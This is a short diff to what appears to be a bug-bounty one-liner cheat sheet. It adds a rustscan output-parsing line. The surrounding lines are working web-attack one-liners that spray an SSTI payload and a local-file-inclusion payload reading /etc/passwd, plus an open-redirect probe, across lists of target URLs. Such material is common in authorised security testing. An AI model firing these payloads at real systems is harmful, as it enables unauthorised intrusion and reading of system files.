@@ -182,3 +182,6 @@ cat ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read
 cat lfi.txt | qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 
 export LOCAL=http://localhost/; cat redirect.txt | qsreplace "$LOCAL" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LOCAL" && echo "VULN! {}"'
+
+#rustscan output parsing
+cat ports.txt | grep -iv batch | grep open | grep -i discovered | awk '{print $6,$4}' | cut -d '/' -f1 | awk '{print $1":"$2}' | less
